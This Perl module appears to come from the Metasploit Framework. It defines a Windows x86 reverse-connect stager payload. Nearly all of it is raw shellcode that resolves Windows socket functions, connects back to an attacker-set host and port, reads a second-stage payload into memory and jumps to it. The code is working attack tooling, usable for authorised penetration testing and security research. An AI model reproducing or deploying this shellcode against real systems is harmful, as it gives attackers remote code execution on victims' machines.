package Msf::PayloadComponent::Windows::ia32::ReverseStagerIE;

use strict;
use base 'Msf::PayloadComponent::Windows::Payload';

sub _Load 
{
	Msf::PayloadComponent::Windows::Payload->_Import('Msf::PayloadComponent::ReverseConnection');

	__PACKAGE__->SUPER::_Load();
}

my $info =
{
	'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'win32' ],
	'Multistage'   => 1,
	'Size'         => '',
	'Payload'      =>
		{
			Offsets  => 
				{ 
					'LPORT' => [ 228, 'n'    ], 
					'LHOST' => [ 221, 'ADDR' ]
				},
			Payload  =>
				"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c".
				"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32".
				"\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07".
				"\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24".
				"\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8".
				"\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64".
				"\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x8e".
				"\x4e\x0e\xec\xff\xd6\x89\xc7\x81\xec\x00\x01\x00\x00\x57\x56\x53".
				"\x89\xe5\xe8\x1f\x00\x00\x00\x90\x01\x00\x00\xb6\x19\x18\xe7\xa4".
				"\x19\x70\xe9\xec\xf9\xaa\x60\xd9\x09\xf5\xad\xcb\xed\xfc\x3b\x57".
				"\x53\x32\x5f\x33\x32\x00\x5b\x8d\x4b\x18\x51\xff\xd7\x89\xdf\x89".
				"\xc3\x8d\x75\x14\x6a\x05\x59\x51\x53\xff\x34\x8f\xff\x55\x04\x59".
				"\x89\x04\x8e\xe2\xf2\x2b\x27\x54\xff\x37\xff\x55\x28\x31\xc0\x50".
				"\x50\x50\x50\x40\x50\x40\x50\xff\x55\x24\x89\xc7\x68\x7f\x00\x00".
				"\x01\x68\x02\x00\x22\x11\x89\xe1\x6a\x10\x51\x57\xff\x55\x20\x59".
				"\x59\xff\x75\x00\x68\xaa\xfc\x0d\x7c\xff\x55\x04\x50\xff\x75\x08".
				"\x89\xe1\x6a\x00\x6a\x08\x51\x57\xff\x55\x1c\x81\xec\x00\x10\x00".
				"\x00\x89\xe3\x6a\x00\x68\x00\x10\x00\x00\x53\x57\xff\x55\x18\xff".
				"\xd3" 
		},
};

sub new
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash);

	return $self;
}

1;
